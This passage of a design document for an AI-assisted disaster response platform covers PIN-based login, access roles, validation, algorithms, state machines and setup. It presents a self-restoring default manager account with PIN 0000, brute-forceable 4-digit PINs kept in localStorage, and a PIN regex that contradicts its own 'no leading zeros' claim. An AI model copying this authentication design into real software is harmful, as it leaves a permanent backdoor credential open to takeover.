  │  - Cookie name: connect.sid                                             │
  │  - Stored in MongoDB 'sessions' collection                              │
  │  - TTL: 24 hours (86400000 ms)                                          │
  │  - HttpOnly: true (prevents XSS access)                                 │
  │  - Secure: true in production (HTTPS only)                              │
  │  - SameSite: 'lax' (CSRF protection)                                    │
  │                                                                         │
  │  Layer 2: PIN Header Fallback (x-auth-pin)                              │
  │  ────────────────────────────────────────────                          │
  │  - Used when cookies unavailable (API clients)                          │
  │  - Sent in HTTP header: x-auth-pin: 1234                                │
  │  - Validated against User collection                                    │
  │                                                                         │
  │  Layer 3: localStorage Persistence                                      │
  │  ─────────────────────────────────────                                  │
  │  - Key: 'disaster_response_auth'                                        │
  │  - Stores: { id, name, role, pin, sessionExpires }                      │
  │  - Client-side session tracking                                         │
  │                                                                         │
  └────────────────────────────────────────────────────────────────────────┘

SESSION CONFIGURATION (server.js):
  
  app.use(session({
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    store: MongoStore.create({
      mongoUrl: process.env.MONGO_URI,
      touchAfter: 24 * 3600,         // Lazy session update (once per day)
      crypto: {
        secret: process.env.SESSION_SECRET  // Encrypt session data
      }
    }),
    cookie: {
      maxAge: 1000 * 60 * 60 * 24,   // 24 hours
      httpOnly: true,                 // No JavaScript access
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax'                 // CSRF protection
    }
  }));

SELF-HEALING MANAGER ACCOUNT:
  
  File: controllers/authController.js
  
  async function ensureDefaultManager() {
    const defaultPin = "0000";
    const existing = await User.findOne({ pin: defaultPin });
    
    if (!existing) {
      await User.create({
        pin: defaultPin,
        name: "Default Manager",
        role: "manager",
        isActive: true
      });
      console.log("Default manager created with PIN: 0000");
      return;
    }
    
    // Self-heal if manager was deactivated or demoted
    const updates = {};
    if (!existing.isActive) updates.isActive = true;
    if (existing.role !== "manager") updates.role = "manager";
    
    if (Object.keys(updates).length > 0) {
      await User.updateOne({ _id: existing._id }, { $set: updates });
      console.log("Default manager reactivated");
    }
  }

PIN GENERATION ALGORITHM:
  
  async function generateUniquePin() {
    let pin;
    let isUnique = false;
    let attempts = 0;
    const maxAttempts = 100;  // Prevent infinite loops
    
    while (!isUnique && attempts < maxAttempts) {
      // Generate 4-digit PIN: 1000-9999 (no leading zeros)
      pin = String(Math.floor(1000 + Math.random() * 9000));
      
      // Verify uniqueness in database
      const existing = await User.findOne({ pin });
      if (!existing) isUnique = true;
      attempts++;
    }
    
    if (!isUnique) {
      throw new Error("Unable to generate unique PIN");
    }
    
    return pin;
  }

13.2 ROLE-BASED ACCESS CONTROL (RBAC)
-------------------------------------

ROLE HIERARCHY:
  
  ┌─────────────────────────────────────────────────────────────────────┐
  │                        ROLE PERMISSIONS                              │
  ├────────────┬────────────────────────────────────────────────────────┤
  │ Role       │ Permissions                                            │
  ├────────────┼────────────────────────────────────────────────────────┤
  │ manager    │ - Full dashboard access                                │
  │            │ - View all reports and needs                           │
  │            │ - Register new volunteers                              │
  │            │ - Deactivate volunteers                                │
  │            │ - Register emergency stations                          │
  │            │ - Complete/reroute missions                            │
  │            │ - Access analytics                                     │
  │            │ - Manage shelters                                      │
  ├────────────┼────────────────────────────────────────────────────────┤
  │ volunteer  │ - View assigned tasks only                             │
  │            │ - Submit audio/photo reports                           │
  │            │ - Verify tasks in the field                            │
  │            │ - Flag suspicious reports                              │
  │            │ - View volunteer route                                 │
  │            │ - SOS emergency button                                 │
  └────────────┴────────────────────────────────────────────────────────┘

MIDDLEWARE IMPLEMENTATIONS:
  
  // requireAuth - Any authenticated user
  export const requireAuth = async (req, res, next) => {
    // Check session first
    if (req.session?.userId) {
      const user = await User.findOne({ _id: req.session.userId, isActive: true });
      if (user) {
        req.user = user;
        return next();
      }
      req.session.destroy();  // Invalid session - clean up
    }
    
    // Fallback to PIN header
    const pin = req.headers["x-auth-pin"];
    if (!pin) return res.status(401).json({ message: "Auth required" });
    
    const user = await User.findOne({ pin, isActive: true });
    if (!user) return res.status(401).json({ message: "Invalid PIN" });
    
    req.user = user;
    next();
  };
  
  // requireManager - Manager role only
  export const requireManager = async (req, res, next) => {
    // ... same auth logic ...
    if (user.role !== "manager") {
      return res.status(403).json({ message: "Manager access required" });
    }
    req.user = user;
    next();
  };

FRONTEND ROUTE PROTECTION:
  
  File: App.jsx
  
  function ProtectedRoute({ children, requireManager = false }) {
    const { isAuthenticated, isManager, loading } = useAuth();
    
    if (loading) return <LoadingSpinner />;
    
    if (!isAuthenticated) {
      return <Navigate to="/login" replace />;
    }
    
    if (requireManager && !isManager) {
      return <Navigate to="/tasks" replace />;
    }
    
    return children;
  }

13.3 INPUT VALIDATION & SANITIZATION
------------------------------------

VALIDATION PATTERNS:
  
  PIN Validation (4 digits, no leading zeros):
    Pattern: /^\d{4}$/
    Valid: "1234", "9999", "1000"
    Invalid: "0123", "123", "12345", "abcd"
  
  Phone Number Validation (Twilio format):
    Pattern: /^\+\d{10,15}$/
    Valid: "+14155551234", "+919876543210"
    Invalid: "555-1234", "+1-555-123-4567"
  
  Email Validation (standard):
    Pattern: /^[^\s@]+@[^\s@]+\.[^\s@]+$/
  
  UUID Validation:
    Pattern: /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i

EXPRESS-VALIDATOR USAGE:
  
  File: routes/authRoutes.js
  
  import { body, validationResult } from 'express-validator';
  
  const validateLogin = [
    body('pin')
      .isLength({ min: 4, max: 4 })
      .withMessage('PIN must be 4 digits')
      .matches(/^\d{4}$/)
      .withMessage('PIN must contain only digits'),
  ];
  
  router.post('/login', validateLogin, (req, res, next) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    next();
  }, loginController);

MONGOOSE SCHEMA VALIDATION:
  
  File: models/UserModel.js
  
  const UserSchema = new mongoose.Schema({
    pin: {
      type: String,
      required: true,
      unique: true,
      match: [/^\d{4}$/, 'PIN must be exactly 4 digits']
    },
    email: {
      type: String,
      trim: true,
      lowercase: true,  // Auto-lowercase
      match: [/^[^\s@]+@[^\s@]+\.[^\s@]+$/, 'Invalid email format']
    },
    role: {
      type: String,
      enum: ['volunteer', 'manager'],  // Whitelist values
      default: 'volunteer'
    }
  });

SQL INJECTION PREVENTION (MongoDB):
  - Mongoose automatically sanitizes queries
  - Object queries prevent injection: { pin: userInput }
  - Avoid $where with user input
  - Never use eval() or similar

XSS PREVENTION:
  - React escapes output by default (JSX)
  - Avoid dangerouslySetInnerHTML
  - HttpOnly cookies prevent JS access
  - Content-Security-Policy headers (production)

13.4 API SECURITY
-----------------

CORS CONFIGURATION:
  
  File: server.js
  
  app.use(cors({
    origin: [
      'http://localhost:5173',        // Vite dev server
      'http://localhost:3000',        // Production frontend
      process.env.FRONTEND_URL        // Configurable
    ],
    credentials: true,                 // Allow cookies
    methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'x-auth-pin', 'Authorization']
  }));

TWILIO WEBHOOK VALIDATION:
  
  File: controllers/emergencySmsController.js
  
  export function getTwilioWebhookValidator() {
    return twilio.webhook({
      validate: process.env.NODE_ENV === 'production'
    });
  }
  
  // Twilio signs requests with HMAC-SHA1
  // Middleware validates signature matches
  // Prevents spoofed SMS webhook calls

FILE UPLOAD SECURITY (Multer):
  
  File: routes/reportRoutes.js
  
  const upload = multer({
    storage: multer.diskStorage({
      destination: './uploads/',
      filename: (req, file, cb) => {
        // Unique filename prevents overwrites
        const unique = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, `audio-${unique}${path.extname(file.originalname)}`);
      }
    }),
    fileFilter: (req, file, cb) => {
      // Whitelist allowed MIME types
      const allowed = ['audio/webm', 'audio/mpeg', 'audio/wav', 'audio/ogg'];
      if (allowed.includes(file.mimetype)) {
        cb(null, true);
      } else {
        cb(new Error('Invalid file type'), false);
      }
    },
    limits: {
      fileSize: 25 * 1024 * 1024  // 25MB (Whisper API limit)
    }
  });

RATE LIMITING (Recommended Production):
  
  // Not implemented in demo but recommended:
  import rateLimit from 'express-rate-limit';
  
  const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,  // 15 minutes
    max: 100,                   // 100 requests per window
    message: 'Too many requests, please try again later'
  });
  
  app.use('/api/', limiter);

================================================================================
                  14. ALGORITHM COMPLEXITY ANALYSIS
================================================================================

This section analyzes the time and space complexity of key algorithms used
in the platform.

14.1 HAVERSINE DISTANCE CALCULATION
-----------------------------------

Function: haversine(lat1, lon1, lat2, lon2)
Location: backend/agents/logistics_agent.py

PURPOSE: Calculate great-circle distance between two points on Earth.

ALGORITHM:
  
  def haversine(lat1, lon1, lat2, lon2):
      R = 6371000  # Earth radius in meters
      
      phi1 = math.radians(lat1)
      phi2 = math.radians(lat2)
      delta_phi = math.radians(lat2 - lat1)
      delta_lambda = math.radians(lon2 - lon1)
      
      a = math.sin(delta_phi/2)**2 + \
          math.cos(phi1) * math.cos(phi2) * math.sin(delta_lambda/2)**2
      c = 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))
      
      return R * c

COMPLEXITY:
  Time:  O(1) - Fixed number of trigonometric operations
  Space: O(1) - Only scalar variables used

ACCURACY:
  - Within 0.5% error for most Earth distances
  - Does not account for Earth's ellipsoidal shape
  - Sufficient for emergency routing (error < 5km for 1000km)

14.2 NEAREST STATION ALGORITHM
------------------------------

Function: find_nearest_station(db, station_type, target_lat, target_lon)
Location: backend/agents/logistics_agent.py

ALGORITHM (Brute Force):
  
  def find_nearest_station(db, station_type, target_lat, target_lon):
      stations = get_registered_stations(db).get(station_type, [])
      
      if not stations:
          return None
      
      nearest = None
      min_distance = float('inf')
      
      for station in stations:
          distance = haversine(
              target_lat, target_lon,
              station['lat'], station['lon']
          )
          if distance < min_distance:
              min_distance = distance
              nearest = station
      
      return (nearest, min_distance)

COMPLEXITY:
  Time:  O(n) where n = number of stations of given type
  Space: O(1) - Only tracking minimum
  
OPTIMIZATION POSSIBILITIES:
  - K-d tree: O(log n) lookup after O(n log n) build
  - Geospatial index: MongoDB 2dsphere for geo queries
  - Grid-based binning: O(1) average case

REAL-WORLD SCALE:
  - Typically 10-100 stations per type in a city
  - O(n) linear scan is acceptable for small n
  - For n > 1000, consider spatial indexing

14.3 OSRM ROUTE CALCULATION
---------------------------

External API Call: OSRM (Open Source Routing Machine)
Location: backend/agents/logistics_agent.py

API ENDPOINT:
  GET /route/v1/driving/{coordinates}

INTERNAL ALGORITHM (Dijkstra/A* variant):
  - OSRM uses contraction hierarchies
  - Preprocessing: O(V log V + E) where V = vertices, E = edges
  - Query time: O(log V) for point-to-point routing
  - Much faster than standard Dijkstra O((V + E) log V)

CLIENT COMPLEXITY (our code):
  Time:  O(w) where w = number of waypoints
  Space: O(p) where p = points in returned polyline
  
NETWORK OVERHEAD:
  - HTTP request latency: 100-500ms typical
  - Response size: 1-50KB depending on route length
  - Timeout: 10 seconds configured

14.4 SMS TRIAGE WITH GEMINI
---------------------------

Function: triageSMS(rawMessage)
Location: backend/services/geminiService.js

PROCESS:
  1. Build prompt string: O(m) where m = message length
  2. API call to Gemini: External service
  3. Parse JSON response: O(r) where r = response size

COMPLEXITY:
  Time:  O(m + r + network_latency)
  Space: O(m + r) for strings

GEMINI MODEL SPECIFICATIONS:
  - Model: gemini-2.5-flash
  - Input limit: 1M tokens
  - Output limit: 8192 tokens
  - Latency: 500ms - 3s typical
  - Rate limit: 60 RPM (free tier)

FALLBACK PARSER:
  
  function fallbackTriage(rawMessage) {
    const location = extractLocationHint(rawMessage);  // O(m * p) regex
    return {
      needType: extractNeedType(rawMessage),           // O(m * p) regex
      location: location || "Unknown",
      details: rawMessage,
      urgency: extractUrgency(rawMessage)              // O(m * p) regex
    };
  }
  
  Time:  O(m * p) where p = number of regex patterns
  Space: O(1) - Only output object

14.5 IMAGE PREPROCESSING
------------------------

Function: preprocess_image(image)
Location: backend/agents/sentinel_agent.py

ALGORITHM:
  
  def preprocess_image(image):
      # 1. Resize: O(w*h) source -> O(224*224) target
      image = image.resize((224, 224))
      
      # 2. RGB conversion: O(224*224)
      if image.mode != 'RGB':
          image = image.convert('RGB')
      
      # 3. NumPy array: O(224*224*3)
      array = np.array(image)
      
      # 4. Normalize: O(224*224*3)
      array = array / 255.0
      
      # 5. Add batch dimension: O(1)
      array = np.expand_dims(array, axis=0)
      
      return array

COMPLEXITY:
  Time:  O(w*h + 224*224*3) = O(w*h + 150,528)
  Space: O(1*224*224*3) = O(150,528) floats ≈ 600KB

TENSORFLOW INFERENCE:
  - Model forward pass: O(L * N^2 * F) for CNN
  - L = layers, N = feature map size, F = filters
  - Actual time: 50-200ms on CPU, 5-20ms on GPU

14.6 REACT QUERY CACHE STRATEGY
-------------------------------

CACHE KEY STRUCTURE:
  ['reports']                  - All reports
  ['reports', { status: 'X' }] - Filtered reports
  ['map-needs']                - Map display needs
  ['missions']                 - Active missions
  ['volunteer-tasks']          - Volunteer assignments

STALE TIME / REFETCH CONFIGURATION:
  
  const queryClient = new QueryClient({
    defaultOptions: {
      queries: {
        staleTime: 5000,       // 5 seconds until stale
        cacheTime: 5 * 60000,  // 5 minutes in cache
        retry: 2,              // 2 retries on failure
        refetchOnWindowFocus: true
      }
    }
  });

CACHE INVALIDATION PATTERNS:
  
  // After mutation:
  await queryClient.invalidateQueries(['reports']);
  
  // Optimistic update:
  queryClient.setQueryData(['reports'], old => 
    old.map(r => r.id === id ? { ...r, status } : r)
  );
  
  // Manual refetch:
  refetch();

COMPLEXITY:
  - Cache lookup: O(1) hash map
  - Cache invalidation: O(k) where k = matching queries
  - Memory: O(n) where n = cached items

================================================================================
                  15. STATE MACHINE DIAGRAMS
================================================================================

15.1 REPORT STATUS STATE MACHINE
--------------------------------

  ┌─────────────────────────────────────────────────────────────────────────┐
  │                     REPORT STATUS TRANSITIONS                            │
  └─────────────────────────────────────────────────────────────────────────┘
  
                              ┌──────────┐
                              │ Pending  │◄─── New report created
                              └────┬─────┘
                                   │
          ┌────────────────────────┼────────────────────────┐
          │                        │                        │
          ▼                        ▼                        ▼
  ┌───────────────┐     ┌───────────────────┐     ┌───────────────┐
  │Processing_    │     │ Processing_Audio  │     │    Error      │
  │Visual         │     └─────────┬─────────┘     │               │
  │               │               │               │ (on failure)  │
  │ (Sentinel     │               │               └───────────────┘
  │  Agent)       │               │
  └───────┬───────┘               │
          │                       │
          ▼                       ▼
  ┌───────────────┐     ┌───────────────────┐
  │ Analyzed_     │     │ Pending_          │
  │ Visual        │     │ Transcription     │
  └───────┬───────┘     └───────────────────┘
          │
          ▼
  ┌───────────────┐
  │ Processing_   │
  │ Oracle        │
  │ (Oracle Agent)│
  └───────┬───────┘
          │
          ▼
  ┌───────────────┐
  │ Analyzed_Full │◄─── All AI analysis complete
  └───────┬───────┘
          │
          ▼
  ┌───────────────┐
  │ Clustered     │◄─── Logistics Agent processed
  └───────┬───────┘
          │
          ▼
  ┌───────────────┐
  │  Resolved     │◄─── Mission completed
  └───────────────┘

15.2 NEED STATUS STATE MACHINE
------------------------------

  ┌───────────────┐     ┌───────────────┐     ┌───────────────┐
  │  Unverified   │────►│   Verified    │────►│  InProgress   │
  │               │     │               │     │               │
  │ (SMS received)│     │ (Volunteer    │     │ (Station      │
  └───────┬───────┘     │  confirmed)   │     │  responding)  │
          │             └───────┬───────┘     └───────┬───────┘
          │                     │                     │
          │                     ▼                     ▼
          │             ┌───────────────┐     ┌───────────────┐
          ▼             │               │     │  Completed    │
  ┌───────────────┐     │    Flagged    │     │               │
  │   Flagged     │     │ (Suspicious)  │     │ (Mission done)│
  └───────────────┘     └───────────────┘     └───────────────┘

15.3 EMERGENCY STATUS STATE MACHINE
-----------------------------------

  ┌────────────────────────────────────────────────────────────────────────┐
  │                    EMERGENCY DISPATCH FLOW                              │
  └────────────────────────────────────────────────────────────────────────┘
  
     ┌─────────┐                                            
     │  none   │◄─── Initial state, not yet processed      
     └────┬────┘                                            
          │                                                 
          │ (Verified by volunteer)                         
          ▼                                                 
     ┌─────────┐                                            
     │ pending │◄─── Ready for station assignment          
     └────┬────┘                                            
          │                                                 
          │ (Logistics Agent assigns station)              
          ▼                                                 
     ┌──────────┐                                           
     │ assigned │◄─── Alert sent to station                
     └────┬─────┘                                           
          │                                                 
          ├─────────────────────┐                          
          │                     │                          
          ▼                     ▼                          
     ┌────────────┐      ┌───────────┐                     
     │ dispatched │      │ rejected  │                     
     │            │      │           │                     
     │ (Station   │      │ (Station  │                     
     │  accepted) │      │  declined)│                     
     └─────┬──────┘      └─────┬─────┘                     
           │                   │                            
           │                   │ (Reroute to another station)
           │                   └──────────────────────┐     
           │                                          │     
           ▼                                          ▼     
     ┌──────────┐                               Back to    
     │ resolved │◄─── Emergency handled         pending    
     └──────────┘                                           

15.4 ALERT DELIVERY STATE MACHINE
---------------------------------

  ┌──────────────────────────────────────────────────────────────────────┐
  │                    STATION ALERT DELIVERY STATES                      │
  └──────────────────────────────────────────────────────────────────────┘
  
       ┌─────────┐
       │ pending │◄─── Alert created, not yet sent
       └────┬────┘
            │
            │ (HTTP POST to station)
            ▼
       ┌─────────┐         ┌─────────┐
       │  sent   │────────►│ failed  │ (Network error, timeout)
       └────┬────┘         └─────────┘
            │
            │ (Station received)
            ▼
       ┌───────────┐
       │ delivered │
       └─────┬─────┘
             │
             ├────────────────────────┬───────────────────────┐
             ▼                        ▼                       ▼
       ┌─────────────┐         ┌───────────┐         ┌───────────┐
       │acknowledged │         │ rejected  │         │responding │
       │             │         │           │         │           │
       │ (Station    │         │ (Station  │         │ (Units    │
       │  ACKed)     │         │  cannot   │         │  deployed)│
       └─────────────┘         │  respond) │         └─────┬─────┘
                               └───────────┘               │
                                                           ▼
                                                     ┌───────────┐
                                                     │ resolved  │
                                                     └───────────┘

================================================================================
                  16. DATA TRANSFORMATION PATTERNS
================================================================================

16.1 DTO (DATA TRANSFER OBJECT) TRANSFORMATIONS
-----------------------------------------------

DATABASE MODEL → API RESPONSE:
  
  File: controllers/volunteerTaskController.js
  
  // Need model → Task DTO
  const toTaskDto = (need) => ({
    id: need._id.toString(),              // ObjectId → String
    taskId: need._id.toString(),
    description: need.triageData?.details || need.rawMessage || "No description",
    notes: need.triageData?.location || "",
    location: need.triageData?.location,
    needType: need.triageData?.needType,
    urgency: need.triageData?.urgency,
    phoneNumber: need.fromNumber,
    status: need.status,
    createdAt: need.createdAt,
    lat: need.coordinates?.lat,           // Nested → flat
    lon: need.coordinates?.lon
  });
  
  // Need model → Map Pin DTO
  const toMapNeedDto = (need) => ({
    id: need._id.toString(),
    lat: need.coordinates?.lat,
    lon: need.coordinates?.lon,
    status: need.status,
    emergencyStatus: need.emergencyStatus || "none",
    emergencyType: need.emergencyType || "general",
    description: need.triageData?.details || need.rawMessage,
    needType: need.triageData?.needType,
    urgency: need.triageData?.urgency
  });

REPORT MODEL → FRONTEND FORMAT:
  
  File: controllers/voiceReportController.js
  
  const transformReport = (report) => ({
    id: report.reportId,                 // UUID
    reportId: report.reportId,
    source: report.source,
    text: report.text,
    status: report.status,
    emergencyStatus: report.emergencyStatus || "none",
    location: report.location,
    lat: report.location?.lat,           // Denormalize
    lon: report.location?.lng,
    tag: report.sentinelData?.tag,       // Extract from nested
    severity: report.oracleData?.severity,
    needs: report.oracleData?.needs || [],
    confidence: report.sentinelData?.confidence,
    transcription: report.audioData?.transcription,
    createdAt: report.createdAt
  });

16.2 GEMINI AI RESPONSE PARSING
-------------------------------

SMS TRIAGE RESPONSE:
  
  File: services/geminiService.js
  
  async function triageSMS(rawMessage) {
    const prompt = `
      Analyze this emergency SMS: "${rawMessage}"
      Return ONLY JSON: {
        "needType": "Water" | "Food" | "Medical" | "Rescue" | "Other",
        "location": "extracted location string",
        "details": "summary of situation",
        "urgency": "Low" | "Medium" | "High"
      }
    `;
    
    const response = await gemini.generateContent(prompt);
    const text = response.response.text();
    
    // Extract JSON from response (may have markdown)
    const jsonMatch = text.match(/\{[\s\S]*\}/);
    if (!jsonMatch) {
      throw new Error("No JSON in response");
    }
    
    const parsed = JSON.parse(jsonMatch[0]);
    
    // Validate and sanitize
    return {
      needType: ['Water','Food','Medical','Rescue','Other'].includes(parsed.needType) 
        ? parsed.needType : 'Other',
      location: String(parsed.location || 'Unknown'),
      details: String(parsed.details || rawMessage),
      urgency: ['Low','Medium','High'].includes(parsed.urgency)
        ? parsed.urgency : 'Medium'
    };
  }

REPORT ANALYSIS RESPONSE:
  
  // Oracle Agent parses severity assessment
  const analysisResult = await analyzeReport(report);
  
  // Expected structure:
  {
    severity: 8,               // Number 1-10
    needs: ["Medical", "Rescue"],  // Array of strings
    summary: "Building collapse with trapped victims"
  }
  
  // Validation:
  const severity = Math.min(10, Math.max(1, parseInt(analysisResult.severity) || 5));
  const needs = Array.isArray(analysisResult.needs) ? analysisResult.needs : [];
  const summary = String(analysisResult.summary || "Analysis unavailable");

16.3 COORDINATE SYSTEM CONVERSIONS
----------------------------------

OSRM ↔ LEAFLET ↔ MONGODB:
  
  ┌────────────────┬────────────────┬────────────────┐
  │ OSRM (GeoJSON) │ Leaflet        │ MongoDB        │
  ├────────────────┼────────────────┼────────────────┤
  │ [lon, lat]     │ [lat, lng]     │ { lat, lng }   │
  │ coordinates[]  │ LatLng         │ location obj   │
  └────────────────┴────────────────┴────────────────┘
  
  // OSRM response → Leaflet polyline
  const osrmCoords = response.routes[0].geometry.coordinates;
  // [[lon1,lat1], [lon2,lat2], ...]
  
  const leafletCoords = osrmCoords.map(([lon, lat]) => [lat, lon]);
  // [[lat1,lon1], [lat2,lon2], ...]
  
  // MongoDB → Leaflet
  const dbLocation = { lat: 18.52, lng: 73.85 };
  const leafletPoint = [dbLocation.lat, dbLocation.lng];
  
  // Frontend uses 'lon' for SMS needs, 'lng' for reports
  const normalizeLng = (coord) => coord.lng ?? coord.lon ?? coord.longitude;

16.4 FRONTEND MEMOIZATION PATTERNS
----------------------------------

  File: pages/DashboardPage.jsx
  
  // Expensive computation cached with useMemo
  const allMapItems = useMemo(() => {
    if (isVolunteer) {
      return [...volunteerMapItems, ...roadConditionMapItems];
    }
    
    const reportItems = analyzedReports.map(report => ({
      id: `report-${report.id}`,
      lat: report.lat,
      lon: report.lon,
      status: report.status,
      category: report.tag || 'Unknown',
      severity: report.severity || 5,
      needs: report.needs || [],
      text: report.text || 'No description',
      isReport: true
    }));
    
    const needItems = needs.map(need => ({
      id: need.id,
      lat: need.lat,
      lon: need.lon,
      status: need.status,
      emergencyStatus: need.emergencyStatus,
      category: need.needType || 'Unknown',
      severity: severityScoreMap[need.urgency?.toLowerCase()] || 5,
      needs: [],
      text: need.description,
      isReport: false
    }));
    
    return [...reportItems, ...needItems, ...sosMapItems, ...roadConditionMapItems];
  }, [
    isVolunteer, volunteerMapItems, analyzedReports, needs,
    sosMapItems, roadConditionMapItems
  ]);
  
  // Re-computed only when dependencies change

================================================================================
                       17. INSTALLATION & SETUP
================================================================================

PREREQUISITES:
- Node.js v16 or higher
- Python 3.8+ with pip
- MongoDB (local or Atlas)
- Git

STEP 1: Clone Repository
------------------------
git clone <repository-url>
cd disaster-response-platform

STEP 2: Install Root Dependencies
---------------------------------
npm install

STEP 3: Install Backend Dependencies
------------------------------------
cd backend
npm install

STEP 4: Setup Python Virtual Environment
----------------------------------------
cd agents
python -m venv venv
# Windows:
venv\Scripts\activate
# Linux/Mac:
source venv/bin/activate

pip install -r requirements.txt
cd ..

STEP 5: Install Frontend Dependencies
-------------------------------------
cd ../frontend
npm install

STEP 6: Setup Station Demo (Optional)
-------------------------------------
cd ../station-demo
npm install

STEP 7: Configure Environment
-----------------------------
Copy .env.example to .env in backend/ and fill in:
- MongoDB connection string
- Gemini API key
- Twilio credentials
- Cloudinary credentials
- Session secret

STEP 8: Start Development Servers
---------------------------------
From root directory:
npm run dev

This starts:
- Backend on http://localhost:5000
- Frontend on http://localhost:5173
- All three AI agents (Sentinel, Oracle, Logistics)

To start station demos:
cd station-demo
npm run start:all

STEP 9: Access the Application
------------------------------
- Frontend: http://localhost:5173
- Backend API: http://localhost:5000/api
- Station Dashboards: http://localhost:4001-4004

DEFAULT LOGIN:
- PIN: 0000 (Manager account)

================================================================================
                  18. PERFORMANCE OPTIMIZATION STRATEGIES
================================================================================

18.1 DATABASE OPTIMIZATION
--------------------------

INDEXING STRATEGY:
  
  ┌────────────────────────────────────────────────────────────────────────┐
  │                    MONGODB INDEX CONFIGURATION                          │
  ├────────────────────────────────────────────────────────────────────────┤
  │ Collection          │ Index                    │ Purpose               │
  ├────────────────────────────────────────────────────────────────────────┤
  │ reports             │ { status: 1 }            │ Agent polling queries │
  │                     │ { createdAt: -1 }        │ Recent reports list   │
  │                     │ { location.lat: 1,       │ Geospatial queries    │
  │                     │   location.lng: 1 }      │                       │
  │                     │ { reportId: 1 } (unique) │ UUID lookup           │
  ├────────────────────────────────────────────────────────────────────────┤
  │ needs               │ { status: 1 }            │ Task filtering        │
  │                     │ { coordinates.lat: 1,    │ Map display           │
  │                     │   coordinates.lon: 1 }   │                       │
  ├────────────────────────────────────────────────────────────────────────┤
  │ emergencystations   │ { type: 1, status: 1 }   │ Station lookup        │
  │                     │ { location.lat: 1,       │ Nearest station       │
  │                     │   location.lng: 1 }      │                       │
  ├────────────────────────────────────────────────────────────────────────┤
  │ users               │ { pin: 1 } (unique)      │ Auth lookup           │
  ├────────────────────────────────────────────────────────────────────────┤
  │ missingpersons      │ { fullName: 'text',      │ Search                │
  │                     │   description: 'text' }  │                       │
  └────────────────────────────────────────────────────────────────────────┘

QUERY OPTIMIZATION PATTERNS:
  
  // Bad: Fetches all fields
  const reports = await Report.find({ status: 'Pending' });
  
  // Good: Projection limits fields returned
  const reports = await Report.find(
    { status: 'Pending' },
    { reportId: 1, imageUrl: 1, status: 1 }  // Only needed fields
  );
  
  // Good: Lean queries for read-only data
  const reports = await Report.find({ status: 'Pending' })
    .lean()  // Returns plain JS objects, not Mongoose docs
    .limit(50);

CONNECTION POOLING:
  
  // MongoDB driver maintains connection pool
  // Default: 100 connections per host
  // Mongoose reuses single connection across requests
  mongoose.connect(MONGO_URI, {
    maxPoolSize: 100,      // Max concurrent connections
    minPoolSize: 10,       // Keep warm connections
    serverSelectionTimeoutMS: 5000,
    socketTimeoutMS: 45000
  });

18.2 API RESPONSE OPTIMIZATION
------------------------------

PAGINATION:
  
  // Without pagination: Loads all records
  const allReports = await Report.find();  // Could be 10,000+ docs
  
  // With pagination: Controlled chunks
  async function getReportsPaginated(page = 1, limit = 50) {
    const skip = (page - 1) * limit;
    
    const [reports, total] = await Promise.all([
      Report.find().skip(skip).limit(limit).lean(),
      Report.countDocuments()
    ]);
    
    return {
      data: reports,
      pagination: {
        page,
        limit,
        total,
        pages: Math.ceil(total / limit)
      }
    };
  }

RESPONSE COMPRESSION:
  
  // Recommended for production (not in current codebase)
  import compression from 'compression';
  
  app.use(compression({
    filter: (req, res) => {
      // Only compress text-based responses
      if (req.headers['x-no-compression']) return false;
      return compression.filter(req, res);
    },
    threshold: 1024  // Only compress > 1KB
  }));

CACHING HEADERS:
  
  // Static assets (frontend build)
  app.use('/assets', express.static('dist/assets', {
    maxAge: '1y',  // Cache for 1 year
    immutable: true
  }));
  
  // API responses (short cache for dynamic data)
  res.set('Cache-Control', 'private, max-age=60');  // 1 minute

18.3 FRONTEND PERFORMANCE
-------------------------

REACT QUERY STALE-WHILE-REVALIDATE:
  
  // Data is served from cache immediately, then refreshed in background
  const { data } = useQuery({
    queryKey: ['reports'],
    queryFn: getReports,
    staleTime: 5000,     // Fresh for 5 seconds
    cacheTime: 300000,   // Cached for 5 minutes
    refetchOnMount: true,
    refetchOnWindowFocus: true
  });

CODE SPLITTING (Vite):
  
  // Lazy load heavy components
  const AnalyticsDashboard = lazy(() => 
    import('./components/AnalyticsDashboard')
  );
  
  // In JSX:
  <Suspense fallback={<Loading />}>
    <AnalyticsDashboard />
  </Suspense>

IMAGE OPTIMIZATION:
  
  // Cloudinary transformations for optimized delivery
  const getOptimizedUrl = (url, width = 400) => {
    if (!url?.includes('cloudinary')) return url;
    
    // Insert transformation before upload/
    return url.replace(
      '/upload/',
      `/upload/w_${width},f_auto,q_auto/`
    );
    // w_400: Resize to 400px width
    // f_auto: Auto-select best format (WebP, AVIF)
    // q_auto: Auto-select quality
  };

MAP TILE CACHING (Offline):
  
  // IndexedDB stores map tiles for offline use
  const cacheMapTile = async (key, tileData) => {
    await db.mapTiles.put({ key, data: tileData, cachedAt: Date.now() });
  };
  
  const getTileFromCache = async (key) => {
    const cached = await db.mapTiles.get(key);
    if (cached && Date.now() - cached.cachedAt < 86400000) {  // 24 hours
      return cached.data;
    }
    return null;
  };

18.4 AGENT PERFORMANCE
----------------------

POLLING INTERVALS:
  
  ┌─────────────────────────────────────────────────────────────────────┐
  │                    AGENT POLLING CONFIGURATION                       │
  ├──────────────────┬──────────────┬───────────────────────────────────┤
  │ Agent            │ Interval     │ Rationale                         │
  ├──────────────────┼──────────────┼───────────────────────────────────┤
  │ Sentinel         │ 2 seconds    │ Fast image processing important   │
  │ Oracle           │ 3 seconds    │ Balanced with API rate limits     │
  │ Logistics        │ 5 seconds    │ Less time-critical, batches work  │
  └──────────────────┴──────────────┴───────────────────────────────────┘

ATOMIC LOCKING:
  
  // Prevents multiple agents processing same report
  const report = await Report.findOneAndUpdate(
    { status: 'Pending', imageUrl: { $exists: true } },
    { $set: { status: 'Processing_Visual' } },
    { new: true }  // Return updated doc
  );
  
  // If report is null, another agent got it first
  if (!report) return;

STATION CACHE:
  
  # logistics_agent.py - Reduces DB queries
  _stations_cache = {}
  _stations_cache_time = 0
